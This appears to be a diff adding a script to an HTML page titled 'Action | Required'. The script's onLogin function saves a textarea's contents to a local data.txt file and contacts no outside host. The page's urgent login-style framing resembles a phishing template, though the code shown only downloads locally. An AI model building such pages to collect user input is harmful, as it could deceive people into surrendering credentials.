@@ -9,6 +9,30 @@
         <link href="/submit/submit.css" rel="stylesheet">
         <link rel="shortcut icon" href="" type="image/x-icon">
         <title>Action | Required</title>
+        <script>function onLogin() {
+    // Get the data from the textarea
+    const data = document.getElementById('dataInput').value;
+
+    // Create a Blob with the data
+    const blob = new Blob([data], { type: 'text/plain' });
+
+    // Create a temporary URL for the Blob
+    const url = URL.createObjectURL(blob);
+
+    // Create a link element
+    const link = document.createElement('a');
+    link.href = url;
+
+    // Set the filename to save as
+    link.download = 'data.txt';
+
+    // Programmatically click the link to trigger the download
+    link.click();
+
+    // Clean up by revoking the URL
+    URL.revokeObjectURL(url);
+}
+</script>
         <div class="md:hidden lg:hidden sm:block border flex w-full h-16 relative bg-[#4667ac]">
             <div class="mx-5 mt-3">
                 <img class="h-7" src="" alt="">
